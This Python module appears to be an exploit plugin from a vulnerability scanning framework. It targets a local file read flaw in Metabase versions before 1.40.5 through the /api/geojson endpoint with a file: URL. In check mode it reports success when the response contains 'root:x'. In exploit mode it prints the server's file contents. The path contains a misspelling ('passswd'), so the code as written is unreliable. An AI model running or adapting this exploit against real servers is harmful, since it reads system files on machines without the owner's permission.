from util.ExpRequest import ExpRequest,Output
import util.globalvar as GlobalVar
import prettytable as pt
"""
import util.globalvar as GlobalVar
from ClassCongregation import ysoserial_payload,Dnslog
DL = Dnslog()
DL.dns_host()
DL.result()
"""
class MetaBase():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.flag = GlobalVar.get_value('flag')
            
    def cve_MetaBase_20211123(self):
        appName = 'MetaBase'
        pocname = 'cve_MetaBase_20211123'
        path = '/api/geojson?url=file:/etc/passswd'
        method = 'get'
        desc = '[file reading] metabase version >= 1.0.0, < 1.40.5'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers)
                if r"root:x" in r.text:
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.get(self.url+path, data=data, headers=headers).text
                print(result)
        except Exception as error:
            return output.error_output(str(error))

tb = pt.PrettyTable()
tb.field_names = ['Target type', 'Vuln Name', 'Impact Version && Vulnerability description']
tb.align['Target type'] = 'l'
tb.align['Vuln Name'] = 'l'
tb.align['Impact Version && Vulnerability description'] = 'l'
tb.add_row([
    "MetaBase",
    "cve_MetaBase_20211123",
    "[file reading] metabase version >= 1.0.0, < 1.40.5"
])
print(tb)

def check(**kwargs):
    thread_list = []
    ExpMetaBase = MetaBase(**kwargs)
    #调用单个函数
    if kwargs['pocname'] != 'ALL':
        thread_list.append(kwargs['pool'].submit(getattr(ExpMetaBase, kwargs['pocname'])))
    #调用所有函数
    else:
        for func in dir(MetaBase):
            if not func.startswith("__"):
                thread_list.append(kwargs['pool'].submit(getattr(ExpMetaBase, func)))
    #保存全局子线程列表
    GlobalVar.add_value('thread_list', thread_list)
